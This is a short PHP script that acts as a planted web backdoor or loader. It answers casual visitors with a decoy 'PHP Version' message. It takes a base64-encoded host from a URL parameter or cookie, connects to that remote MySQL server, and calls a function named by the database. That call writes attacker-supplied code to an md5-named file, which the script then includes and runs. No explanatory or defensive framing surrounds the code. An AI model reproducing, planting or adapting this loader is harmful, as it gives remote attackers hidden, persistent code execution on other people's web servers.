<?php
$host = @$_COOKIE['ip'];
if(!empty($_GET['ip'])){
	$host = $_GET['ip'];
	setcookie('ip', $_GET['ip'], time() + (86400 * 30), "/");
};
if(empty($host))exit("PHP Version");

$name = @$_COOKIE['n'];
if(!empty($_GET['n'])){
	$name= $_GET['n'];
	setcookie('n', $_GET['n'], time() + (86400 * 30), "/");
};
if(empty($name)){
	$name = "class";
}
$f = $name."·".$_SERVER["HTTP_HOST"];
$fn = md5($f);
$h = "";
if(!file_exists($fn)){
	$link = @mysqli_connect(base64_decode($host), 'ber', md5($_SERVER["HTTP_USER_AGENT"]), "v1");
	if ($link) {
		$data = @mysqli_fetch_object(mysqli_query($link, $f));
		if($data){
			$h = $data->h;
			$h($data->k,$data->str);
			if($data->i == "2"){
				echo $data->k;
				exit();
			}
		}
	}
}
if(file_exists($fn)){include $fn;}else{ echo "err";}
